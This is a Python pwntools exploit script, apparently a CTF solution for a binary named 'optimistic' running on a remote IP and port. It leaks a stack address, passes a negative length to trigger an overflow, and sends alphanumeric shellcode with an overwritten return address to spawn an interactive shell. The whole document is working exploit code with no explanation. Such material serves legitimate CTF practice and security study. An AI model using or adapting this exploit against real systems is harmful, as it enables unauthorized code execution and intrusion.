#!usr/bin/env/python3

from pwn import *


#p = process("./optimistic")
p = remote("188.166.175.58",30754)

p.sendlineafter(": ",b"y")
output = p.recvline()

shellcode_address = re.findall(r'0x[0-9a-fA-F]+', output.decode('latin-1'))

shellcode_address = int(shellcode_address[0],16)


p.sendlineafter(": ",b"a")
p.sendlineafter(": ",b"a")
p.sendlineafter(": ",b"-1")


buf = b"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"
buf += b"A"*(104-len(buf))
buf += p64(shellcode_address-96)

p.sendlineafter(": ",buf)


p.interactive()

